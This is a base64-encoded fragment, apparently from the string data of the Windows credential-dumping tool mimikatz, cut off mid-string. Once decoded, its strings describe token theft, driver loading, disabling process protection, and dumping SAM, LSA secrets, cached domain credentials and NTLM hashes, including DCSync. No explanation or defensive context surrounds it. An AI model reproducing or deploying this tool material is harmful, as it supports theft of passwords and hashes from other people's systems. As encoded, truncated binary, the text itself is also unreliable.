bwBrAGUAbgAAAAAAAAAAAEQAdQBwAGwAaQBjAGEAdABlACAAcAByAG8AYwBlAHMAcwAgAHQAbwBrAGUAbgAAAHAAcgBvAGMAZQBzAHMAUAByAGkAdgBpAGwAZQBnAGUAAAAAAAAAAABTAGUAdAAgAGEAbABsACAAcAByAGkAdgBpAGwAZQBnAGUAIABvAG4AIABwAHIAbwBjAGUAcwBzAAAAAAAAAAAAbQBvAGQAdQBsAGUAcwAAAEwAaQBzAHQAIABtAG8AZAB1AGwAZQBzAAAAAAAAAAAAcwBzAGQAdAAAAAAAAAAAAEwAaQBzAHQAIABTAFMARABUAAAAAAAAAG4AbwB0AGkAZgBQAHIAbwBjAGUAcwBzAAAAAAAAAAAATABpAHMAdAAgAHAAcgBvAGMAZQBzAHMAIABuAG8AdABpAGYAeQAgAGMAYQBsAGwAYgBhAGMAawBzAAAAAAAAAG4AbwB0AGkAZgBUAGgAcgBlAGEAZAAAAEwAaQBzAHQAIAB0AGgAcgBlAGEAZAAgAG4AbwB0AGkAZgB5ACAAYwBhAGwAbABiAGEAYwBrAHMAAAAAAAAAAABuAG8AdABpAGYASQBtAGEAZwBlAAAAAABMAGkAcwB0ACAAaQBtAGEAZwBlACAAbgBvAHQAaQBmAHkAIABjAGEAbABsAGIAYQBjAGsAcwAAAG4AbwB0AGkAZgBSAGUAZwAAAAAAAAAAAEwAaQBzAHQAIAByAGUAZwBpAHMAdAByAHkAIABuAG8AdABpAGYAeQAgAGMAYQBsAGwAYgBhAGMAawBzAAAAAABuAG8AdABpAGYATwBiAGoAZQBjAHQAAABMAGkAcwB0ACAAbwBiAGoAZQBjAHQAIABuAG8AdABpAGYAeQAgAGMAYQBsAGwAYgBhAGMAawBzAAAAAAAAAAAAbgBvAHQAaQBmAFAAcgBvAGMAZQBzAHMAUgBlAG0AbwB2AGUAAAAAAFIAZQBtAG8AdgBlACAAcAByAG8AYwBlAHMAcwAgAG4AbwB0AGkAZgB5ACAAYwBhAGwAbABiAGEAYwBrAAAAAABuAG8AdABpAGYATwBiAGoAZQBjAHQAUgBlAG0AbwB2AGUAAAAAAAAAUgBlAG0AbwB2AGUAIABvAGIAagBlAGMAdAAgAG4AbwB0AGkAZgB5ACAAYwBhAGwAbABiAGEAYwBrAAAAAAAAAGYAaQBsAHQAZQByAHMAAABMAGkAcwB0ACAARgBTACAAZgBpAGwAdABlAHIAcwAAAG0AaQBuAGkAZgBpAGwAdABlAHIAcwAAAEwAaQBzAHQAIABtAGkAbgBpAGYAaQBsAHQAZQByAHMAAAAAAAAAAABtAGkAbQBpAGQAcgB2AC4AcwB5AHMAAABtAGkAbQBpAGQAcgB2AAAAAAAAAAAAAABbACsAXQAgAG0AaQBtAGkAawBhAHQAegAgAGQAcgBpAHYAZQByACAAYQBsAHIAZQBhAGQAeQAgAHIAZQBnAGkAcwB0AGUAcgBlAGQACgAAAFsAKgBdACAAbQBpAG0AaQBrAGEAdAB6ACAAZAByAGkAdgBlAHIAIABuAG8AdAAgAHAAcgBlAHMAZQBuAHQACgAAAAAAAAAAAG0AaQBtAGkAawBhAHQAegAgAGQAcgBpAHYAZQByACAAKABtAGkAbQBpAGQAcgB2ACkAAAAAAAAAWwArAF0AIABtAGkAbQBpAGsAYQB0AHoAIABkAHIAaQB2AGUAcgAgAHMAdQBjAGMAZQBzAHMAZgB1AGwAbAB5ACAAcgBlAGcAaQBzAHQAZQByAGUAZAAKAAAAAAAAAAAAWwArAF0AIABtAGkAbQBpAGsAYQB0AHoAIABkAHIAaQB2AGUAcgAgAEEAQwBMACAAdABvACAAZQB2AGUAcgB5AG8AbgBlAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAG4AZQBsAF8AYQBkAGQAXwBtAGkAbQBpAGQAcgB2ACAAOwAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwBhAGQAZABXAG8AcgBsAGQAVABvAE0AaQBtAGkAawBhAHQAegAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAGEAZABkAF8AbQBpAG0AaQBkAHIAdgAgADsAIABDAHIAZQBhAHQAZQBTAGUAcgB2AGkAYwBlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAG4AZQBsAF8AYQBkAGQAXwBtAGkAbQBpAGQAcgB2ACAAOwAgAGsAdQBsAGwAXwBtAF8AZgBpAGwAZQBfAGkAcwBGAGkAbABlAEUAeABpAHMAdAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAG4AZQBsAF8AYQBkAGQAXwBtAGkAbQBpAGQAcgB2ACAAOwAgAGsAdQBsAGwAXwBtAF8AZgBpAGwAZQBfAGcAZQB0AEEAYgBzAG8AbAB1AHQAZQBQAGEAdABoAE8AZgAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAGEAZABkAF8AbQBpAG0AaQBkAHIAdgAgADsAIABPAHAAZQBuAFMAZQByAHYAaQBjAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAFsAKwBdACAAbQBpAG0AaQBrAGEAdAB6ACAAZAByAGkAdgBlAHIAIABzAHQAYQByAHQAZQBkAAoAAAAAAAAAAABbACoAXQAgAG0AaQBtAGkAawBhAHQAegAgAGQAcgBpAHYAZQByACAAYQBsAHIAZQBhAGQAeQAgAHMAdABhAHIAdABlAGQACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwBhAGQAZABfAG0AaQBtAGkAZAByAHYAIAA7ACAAUwB0AGEAcgB0AFMAZQByAHYAaQBjAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAGEAZABkAF8AbQBpAG0AaQBkAHIAdgAgADsAIABPAHAAZQBuAFMAQwBNAGEAbgBhAGcAZQByACgAYwByAGUAYQB0AGUAKQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAFsAKwBdACAAbQBpAG0AaQBrAGEAdAB6ACAAZAByAGkAdgBlAHIAIABzAHQAbwBwAHAAZQBkAAoAAAAAAAAAAAAAAAAAAAAAAFsAKgBdACAAbQBpAG0AaQBrAGEAdAB6ACAAZAByAGkAdgBlAHIAIABuAG8AdAAgAHIAdQBuAG4AaQBuAGcACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAHIAZQBtAG8AdgBlAF8AbQBpAG0AaQBkAHIAdgAgADsAIABrAHUAbABsAF8AbQBfAHMAZQByAHYAaQBjAGUAXwBzAHQAbwBwACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAFsAKwBdACAAbQBpAG0AaQBrAGEAdAB6ACAAZAByAGkAdgBlAHIAIAByAGUAbQBvAHYAZQBkAAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwByAGUAbQBvAHYAZQBfAG0AaQBtAGkAZAByAHYAIAA7ACAAawB1AGwAbABfAG0AXwBzAGUAcgB2AGkAYwBlAF8AcgBlAG0AbwB2AGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAHIAZQBtAG8AdgBlAAAAAABQAHIAbwBjAGUAcwBzACAAOgAgACUAcwAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwBwAHIAbwBjAGUAcwBzAFAAcgBvAHQAZQBjAHQAIAA7ACAAawB1AGwAbABfAG0AXwBwAHIAbwBjAGUAcwBzAF8AZwBlAHQAUAByAG8AYwBlAHMAcwBJAGQARgBvAHIATgBhAG0AZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAHAAaQBkAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAHAAcgBvAGMAZQBzAHMAUAByAG8AdABlAGMAdAAgADsAIABBAHIAZwB1AG0AZQBuAHQAIAAvAHAAcgBvAGMAZQBzAHMAOgBwAHIAbwBnAHIAYQBtAC4AZQB4AGUAIABvAHIAIAAvAHAAaQBkADoAcAByAG8AYwBlAHMAcwBpAGQAIABuAGUAZQBkAGUAZAAKAAAAAAAAAAAAUABJAEQAIAAlAHUAIAAtAD4AIAAlADAAMgB4AC8AJQAwADIAeAAgAFsAJQAxAHgALQAlADEAeAAtACUAMQB4AF0ACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAG4AZQBsAF8AcAByAG8AYwBlAHMAcwBQAHIAbwB0AGUAYwB0ACAAOwAgAE4AbwAgAFAASQBEAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAG4AZQBsAF8AcAByAG8AYwBlAHMAcwBQAHIAbwB0AGUAYwB0ACAAOwAgAFAAcgBvAHQAZQBjAHQAZQBkACAAcAByAG8AYwBlAHMAcwAgAG4AbwB0ACAAYQB2AGEAaQBsAGEAYgBsAGUAIABiAGUAZgBvAHIAZQAgAFcAaQBuAGQAbwB3AHMAIABWAGkAcwB0AGEACgAAAAAAZgByAG8AbQAAAAAAdABvAAAAAAAAAAAAVABvAGsAZQBuACAAZgByAG8AbQAgAHAAcgBvAGMAZQBzAHMAIAAlAHUAIAB0AG8AIABwAHIAbwBjAGUAcwBzACAAJQB1AAoAAAAAAAAAAAAgACoAIABmAHIAbwBtACAAMAAgAHcAaQBsAGwAIAB0AGEAawBlACAAUwBZAFMAVABFAE0AIAB0AG8AawBlAG4ACgAAAAAAAAAAAAAAAAAAACAAKgAgAHQAbwAgADAAIAB3AGkAbABsACAAdABhAGsAZQAgAGEAbABsACAAJwBjAG0AZAAnACAAYQBuAGQAIAAnAG0AaQBtAGkAawBhAHQAegAnACAAcAByAG8AYwBlAHMAcwAKAAAAVABhAHIAZwBlAHQAIAA9ACAAMAB4ACUAcAAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwBuAG8AdABpAGYAeQBHAGUAbgBlAHIAaQBjAFIAZQBtAG8AdgBlACAAOwAgAE4AbwAgAGEAZABkAHIAZQBzAHMAPwAKAAAAAABzAGEAbQAAAAAAAAAAAAAARwBlAHQAIAB0AGgAZQAgAFMAeQBzAEsAZQB5ACAAdABvACAAZABlAGMAcgB5AHAAdAAgAFMAQQBNACAAZQBuAHQAcgBpAGUAcwAgACgAZgByAG8AbQAgAHIAZQBnAGkAcwB0AHIAeQAgAG8AcgAgAGgAaQB2AGUAcwApAAAAAABzAGUAYwByAGUAdABzAAAARwBlAHQAIAB0AGgAZQAgAFMAeQBzAEsAZQB5ACAAdABvACAAZABlAGMAcgB5AHAAdAAgAFMARQBDAFIARQBUAFMAIABlAG4AdAByAGkAZQBzACAAKABmAHIAbwBtACAAcgBlAGcAaQBzAHQAcgB5ACAAbwByACAAaABpAHYAZQBzACkAAAAAAAAAAAAAAAAARwBlAHQAIAB0AGgAZQAgAFMAeQBzAEsAZQB5ACAAdABvACAAZABlAGMAcgB5AHAAdAAgAE4ATAAkAEsATQAgAHQAaABlAG4AIABNAFMAQwBhAGMAaABlACgAdgAyACkAIAAoAGYAcgBvAG0AIAByAGUAZwBpAHMAdAByAHkAIABvAHIAIABoAGkAdgBlAHMAKQAAAAAAAABsAHMAYQAAAEEAcwBrACAATABTAEEAIABTAGUAcgB2AGUAcgAgAHQAbwAgAHIAZQB0AHIAaQBlAHYAZQAgAFMAQQBNAC8AQQBEACAAZQBuAHQAcgBpAGUAcwAgACgAbgBvAHIAbQBhAGwALAAgAHAAYQB0AGMAaAAgAG8AbgAgAHQAaABlACAAZgBsAHkAIABvAHIAIABpAG4AagBlAGMAdAApAAAAAAB0AHIAdQBzAHQAAAAAAAAAQQBzAGsAIABMAFMAQQAgAFMAZQByAHYAZQByACAAdABvACAAcgBlAHQAcgBpAGUAdgBlACAAVAByAHUAcwB0ACAAQQB1AHQAaAAgAEkAbgBmAG8AcgBtAGEAdABpAG8AbgAgACgAbgBvAHIAbQBhAGwAIABvAHIAIABwAGEAdABjAGgAIABvAG4AIAB0AGgAZQAgAGYAbAB5ACkAAAAAAGIAYQBjAGsAdQBwAGsAZQB5AHMAAAAAAHIAcABkAGEAdABhAAAAAABkAGMAcwB5AG4AYwAAAAAAAAAAAAAAAABBAHMAawAgAGEAIABEAEMAIAB0AG8AIABzAHkAbgBjAGgAcgBvAG4AaQB6AGUAIABhAG4AIABvAGIAagBlAGMAdAAAAAAAAABsAHMAYQBkAHUAbQBwAAAATABzAGEARAB1AG0AcAAgAG0AbwBkAHUAbABlAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAHMAYQBtACAAOwAgAEMAcgBlAGEAdABlAEYAaQBsAGUAIAAoAFMAWQBTAFQARQBNACAAaABpAHYAZQApACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AcwBhAG0AIAA7ACAAQwByAGUAYQB0AGUARgBpAGwAZQAgACgAUwBBAE0AIABoAGkAdgBlACkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAUwBZAFMAVABFAE0AAAAAAFMAQQBNAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AcwBhAG0AIAA7ACAAawB1AGwAbABfAG0AXwByAGUAZwBpAHMAdAByAHkAXwBSAGUAZwBPAHAAZQBuAEsAZQB5AEUAeAAgACgAUwBBAE0AKQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAawBpAHcAaQAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAHMAZQBjAHIAZQB0AHMATwByAEMAYQBjAGgAZQAgADsAIABDAHIAZQBhAHQAZQBGAGkAbABlACAAKABTAEUAQwBVAFIASQBUAFkAIABoAGkAdgBlACkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBzAGUAYwByAGUAdABzAE8AcgBDAGEAYwBoAGUAIAA7ACAAQwByAGUAYQB0AGUARgBpAGwAZQAgACgAUwBZAFMAVABFAE0AIABoAGkAdgBlACkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAFMARQBDAFUAUgBJAFQAWQAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAHMAZQBjAHIAZQB0AHMATwByAEMAYQBjAGgAZQAgADsAIABrAHUAbABsAF8AbQBfAHIAZQBnAGkAcwB0AHIAeQBfAFIAZQBnAE8AcABlAG4ASwBlAHkARQB4ACAAKABTAEUAQwBVAFIASQBUAFkAKQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAQwB1AHIAcgBlAG4AdAAAAEQAZQBmAGEAdQBsAHQAAABDAG8AbgB0AHIAbwBsAFMAZQB0ADAAMAAwAAAAAAAAAFMAZQBsAGUAYwB0AAAAAAAlADAAMwB1AAAAAABKAEQAAAAAAAAAAABTAGsAZQB3ADEAAAAAAAAARwBCAEcAAABEAGEAdABhAAAAAAAlAHgAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AFMAeQBzAGsAZQB5ACAAOwAgAEwAUwBBACAASwBlAHkAIABDAGwAYQBzAHMAIAByAGUAYQBkACAAZQByAHIAbwByAAoAAAAAAEQAbwBtAGEAaQBuACAAOgAgAAAAAAAAAEMAbwBuAHQAcgBvAGwAXABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQBcAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlAAAAAAAAAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlAAAAAAAAAAAAJQBzAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABDAG8AbQBwAHUAdABlAHIAQQBuAGQAUwB5AHMAawBlAHkAIAA7ACAAawB1AGwAbABfAG0AXwByAGUAZwBpAHMAdAByAHkAXwBSAGUAZwBRAHUAZQByAHkAVgBhAGwAdQBlAEUAeAAgAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACAASwBPAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABDAG8AbQBwAHUAdABlAHIAQQBuAGQAUwB5AHMAawBlAHkAIAA7ACAAcAByAGUAIAAtACAAawB1AGwAbABfAG0AXwByAGUAZwBpAHMAdAByAHkAXwBSAGUAZwBRAHUAZQByAHkAVgBhAGwAdQBlAEUAeAAgAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACAASwBPAAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZwBlAHQAQwBvAG0AcAB1AHQAZQByAEEAbgBkAFMAeQBzAGsAZQB5ACAAOwAgAGsAdQBsAGwAXwBtAF8AcgBlAGcAaQBzAHQAcgB5AF8AUgBlAGcATwBwAGUAbgBLAGUAeQBFAHgAIABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgAEsATwAKAAAAAAAAAFMAeQBzAEsAZQB5ACAAOgAgAAAAAAAAAEMAbwBuAHQAcgBvAGwAXABMAFMAQQAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZwBlAHQAQwBvAG0AcAB1AHQAZQByAEEAbgBkAFMAeQBzAGsAZQB5ACAAOwAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AFMAeQBzAGsAZQB5ACAASwBPAAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AEMAbwBtAHAAdQB0AGUAcgBBAG4AZABTAHkAcwBrAGUAeQAgADsAIABrAHUAbABsAF8AbQBfAHIAZQBnAGkAcwB0AHIAeQBfAFIAZQBnAE8AcABlAG4ASwBlAHkARQB4ACAATABTAEEAIABLAE8ACgAAAAAAAAAAAFMAQQBNAFwARABvAG0AYQBpAG4AcwBcAEEAYwBjAG8AdQBuAHQAAABWAAAAAAAAAEwAbwBjAGEAbAAgAFMASQBEACAAOgAgAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABVAHMAZQByAHMAQQBuAGQAUwBhAG0ASwBlAHkAIAA7ACAAawB1AGwAbABfAG0AXwByAGUAZwBpAHMAdAByAHkAXwBSAGUAZwBRAHUAZQByAHkAVgBhAGwAdQBlAEUAeAAgAFYAIABLAE8ACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZwBlAHQAVQBzAGUAcgBzAEEAbgBkAFMAYQBtAEsAZQB5ACAAOwAgAHAAcgBlACAALQAgAGsAdQBsAGwAXwBtAF8AcgBlAGcAaQBzAHQAcgB5AF8AUgBlAGcAUQB1AGUAcgB5AFYAYQBsAHUAZQBFAHgAIABWACAASwBPAAoAAAAAAAAAAABVAHMAZQByAHMAAAAAAAAATgBhAG0AZQBzAAAAAAAAAAoAUgBJAEQAIAAgADoAIAAlADAAOAB4ACAAKAAlAHUAKQAKAAAAAABVAHMA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TgBMACQASQB0AGUAcgBhAHQAaQBvAG4AQwBvAHUAbgB0ACAAaQBzACAAJQB1ACwAIAAlAHUAIAByAGUAYQBsACAAaQB0AGUAcgBhAHQAaQBvAG4AKABzACkACgAAAAAAAAAAACoAIABEAEMAQwAxACAAbQBvAGQAZQAgACEACgAAAAAAAAAAAAAAAAAqACAASQB0AGUAcgBhAHQAaQBvAG4AIABpAHMAIABzAGUAdAAgAHQAbwAgAGQAZQBmAGEAdQBsAHQAIAAoADEAMAAyADQAMAApAAoAAAAAAE4ATAAkAEMAbwBuAHQAcgBvAGwAAAAAAAoAWwAlAHMAIAAtACAAAABdAAoAUgBJAEQAIAAgACAAIAAgACAAIAA6ACAAJQAwADgAeAAgACgAJQB1ACkACgAAAAAAAAAAAD4AIABLAGkAdwBpACAAbQBvAGQAZQAuAC4ALgAKAAAAIAAgAE0AcwBDAGEAYwBoAGUAVgAyACAAOgAgAAAAAAAgACAAQwBoAGUAYwBrAHMAdQBtACAAIAA6ACAAAAAAAD4AIABPAEsAIQAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABOAEwASwBNAFMAZQBjAHIAZQB0AEEAbgBkAEMAYQBjAGgAZQAgADsAIABrAHUAbABsAF8AbQBfAHIAZQBnAGkAcwB0AHIAeQBfAFIAZQBnAFMAZQB0AFYAYQBsAHUAZQBFAHgAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAACAAIABNAHMAQwBhAGMAaABlAFYAMQAgADoAIAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZwBlAHQATgBMAEsATQBTAGUAYwByAGUAdABBAG4AZABDAGEAYwBoAGUAIAA7ACAAUgB0AGwARQBuAGMAcgB5AHAAdABEAGUAYwByAHkAcAB0AFIAQwA0ACAAOgAgADAAeAAlADAAOAB4AAoAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AE4ATABLAE0AUwBlAGMAcgBlAHQAQQBuAGQAQwBhAGMAaABlACAAOwAgAGsAdQBsAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBoAG0AYQBjACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAVQBzAGUAcgAgACAAIAAgACAAIAA6ACAAJQAuACoAcwBcACUALgAqAHMACgAAAAAATQBzAEMAYQBjAGgAZQBWACUAYwAgADoAIAAAAAAAAABPAGIAagBlAGMAdABOAGEAbQBlAAAAAAAgAC8AIABzAGUAcgB2AGkAYwBlACAAJwAlAHMAJwAgAHcAaQB0AGgAIAB1AHMAZQByAG4AYQBtAGUAIAA6ACAAJQBzAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGQAZQBjAHIAeQBwAHQAUwBlAGMAcgBlAHQAIAA7ACAAawB1AGwAbABfAG0AXwByAGUAZwBpAHMAdAByAHkAXwBSAGUAZwBRAHUAZQByAHkAVgBhAGwAdQBlAEUAeAAgAFMAZQBjAHIAZQB0ACAAdgBhAGwAdQBlACAASwBPAAoAAAAAAAAAdABlAHgAdAA6ACAAJQB3AFoAAAAAAAAAaABlAHgAIAA6ACAAAAAAACQATQBBAEMASABJAE4ARQAuAEEAQwBDAAAAAAAAAAAACgAgACAAIAAgAE4AVABMAE0AOgAAAAAACgAgACAAIAAgAFMASABBADEAOgAAAAAARABQAEEAUABJAF8AUwBZAFMAVABFAE0AAAAAAAAAAAAKACAAIAAgACAAZgB1AGwAbAA6ACAAAAAKACAAIAAgACAAbQAvAHUAIAA6ACAAAAAgAC8AIAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAHMAZQBjAF8AYQBlAHMAMgA1ADYAIAA7ACAAQwByAHkAcAB0AEQAZQBjAHIAeQBwAHQAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AcwBlAGMAXwBhAGUAcwAyADUANgAgADsAIABDAHIAeQBwAHQAUwBlAHQASwBlAHkAUABhAHIAYQBtACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBzAGUAYwBfAGEAZQBzADIANQA2ACAAOwAgAGsAdQBsAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBoAGsAZQB5ACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAHMAYQBtAHMAcgB2AC4AZABsAGwAAAAAAGwAcwBhAHMAcgB2AC4AZABsAGwAAAAAAG4AdABkAGwAbAAuAGQA